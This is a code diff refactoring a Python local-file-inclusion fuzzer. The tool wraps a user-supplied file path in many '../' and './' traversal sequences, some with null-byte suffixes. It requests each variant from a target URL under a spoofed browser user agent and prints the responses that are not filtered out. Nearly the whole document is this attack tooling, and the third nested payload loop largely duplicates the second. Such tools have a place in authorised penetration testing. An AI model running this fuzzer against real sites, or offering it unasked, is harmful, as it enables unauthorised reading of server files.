@@ -3,8 +3,11 @@ import requests
 import getopt
 import sys
 
+from urllib.parse import quote_plus
 from urllib.parse import urlparse
 
+DDS = "../"
+DS = "./"
 
 USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}
 
@@ -30,200 +33,93 @@ def good_code(code, text):
 
 
 def lfi(url, payload, hcode=(), hsize=(), depth=5):
-    dds = "../"
-    ds = "./"
+    dds = DDS
+    ds = DS
     for _ in range(depth):
-        resp = requests.get(f"{url}{dds}{payload}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{dds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
-    
-        resp = requests.get(f"{url}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{dds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{dds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{dds}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{dds}{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{dds}{payload}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{dds}{payload}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{dds}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{dds}{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{dds}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{dds}{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{ds}{payload}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{ds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{ds}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{ds}{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{ds}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{ds}{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{ds}{payload}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{ds}{payload}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{ds}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{ds}{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{ds}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{ds}{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{dds}{ds}{payload}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{dds}{ds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
-        
-        resp = requests.get(f"{url}{ds}{dds}{payload}", headers=USER_AGENT, allow_redirects=False)
-        if resp.status_code not in hcode and len(resp.content) not in hsize:
-            print(good_code(resp.status_code, f"{ds}{dds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
-        dds += dds
-        ds += ds
-    
-    dds = "../"
+        payloads = [f"{dds}{payload}",
+                    f"{payload}{dds}",
+                    f"{ds}{payload}",
+                    f"{payload}{ds}",
+                    f"{dds}{payload}{dds}",
+                    f"{ds}{payload}{ds}",
+                    f"{dds}{ds}{payload}",
+                    f"{ds}{dds}{payload}",
+                    f"{payload}{dds}{ds}",
+                    f"{payload}{ds}{dds}",
+                    f"{dds}{payload}/",
+                    f"{ds}{payload}/",
+                    f"{payload}/{dds}",                    
+                    f"{payload}/{ds}",
+                    f"{dds}{payload}/{dds}",
+                    f"{ds}{payload}/{ds}",
+                    f"{dds}{ds}{payload}/",
+                    f"{ds}{dds}{payload}/",
+                    f"{payload}/{dds}{ds}",
+                    f"{payload}/{ds}{dds}"]
+        for p in payloads:
+            resp = requests.get(f"{url}{p}", headers=USER_AGENT, allow_redirects=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize:
+                print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, allow_redirects=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize:
+                print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+        dds += DDS
+        ds += DS
+
+    ds = DS
     for _ in range(depth):
-        ds = "./"
+        dds = DDS
         for _ in range(depth):
-            resp = requests.get(f"{url}{ds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
+            payloads_two = [f"{ds}{payload}{dds}",
+                            f"{dds}{payload}{ds}",                                                        
+                            f"{dds}{ds}{payload}{ds}",
+                            f"{ds}{dds}{payload}{ds}",
+                            f"{dds}{ds}{payload}{dds}",
+                            f"{ds}{dds}{payload}{dds}",
+                            f"{ds}{payload}/{dds}",
+                            f"{dds}{payload}/{ds}",                                                        
+                            f"{dds}{ds}{payload}/{ds}",
+                            f"{ds}{dds}{payload}/{ds}",
+                            f"{dds}{ds}{payload}/{dds}",
+                            f"{ds}{dds}{payload}/{dds}"]
+            for p in payloads_two:                
+                resp = requests.get(f"{url}{p}", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            dds += DDS
+        ds += DS
+
+    ds = DS
+    for _ in range(depth):
+        ds = DS
+        for _ in range(depth):
+            payloads_two = [f"{ds}{payload}{dds}",
+                            f"{dds}{payload}{ds}",                                                        
+                            f"{dds}{ds}{payload}{ds}",
+                            f"{ds}{dds}{payload}{ds}",
+                            f"{dds}{ds}{payload}{dds}",
+                            f"{ds}{dds}{payload}{dds}",
+                            f"{ds}{payload}/{dds}",
+                            f"{dds}{payload}/{ds}",                                                        
+                            f"{dds}{ds}{payload}/{ds}",
+                            f"{ds}{dds}{payload}/{ds}",
+                            f"{dds}{ds}{payload}/{dds}",
+                            f"{ds}{dds}{payload}/{dds}"]
+            for p in payloads_two:
+                resp = requests.get(f"{url}{p}", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            ds += DS
+        dds += DDS
             
-            resp = requests.get(f"{url}{dds}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
+    
             
-            resp = requests.get(f"{url}{ds}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{ds}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{ds}{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{dds}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{dds}{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{ds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{ds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{dds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{dds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{ds}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{ds}{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{dds}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{dds}{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{ds}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{ds}{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{dds}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{dds}{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{ds}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{ds}{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{dds}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{dds}{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{ds}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{ds}{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{dds}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{dds}{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{ds}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{ds}{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{dds}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{dds}{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{dds}{ds}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{dds}{ds}{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            
-            resp = requests.get(f"{url}{ds}{dds}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
-            if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{ds}{dds}{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            ds += ds
-        dds += dds
 
 
 def parse_url(url):
@@ -254,7 +150,7 @@ def main():
                 elif opt in ("-p", "--path"):                    
                     path = arg
                 elif opt in ("--depth"):                    
-                    deepth = arg
+                    depth = int(arg)
                 elif opt in ("--hcode"):                    
                     hcode = tuple(map(int, arg.split(",")))
                 elif opt in ("--hsize"):                    
@@ -266,8 +162,11 @@ def main():
             help()
             sys.exit(0)
         if url is not None and path is not None:
+            print("\n----------------")
+            print("[!] LFI fuzzing")
+            print("----------------\n")
             url = parse_url(url)            
-            lfi(url, path, hcode=hcode, hsize=hsize, depth=int(depth))
+            lfi(url, path, hcode=hcode, hsize=hsize, depth=depth)
         else:
             help()
     except KeyboardInterrupt:
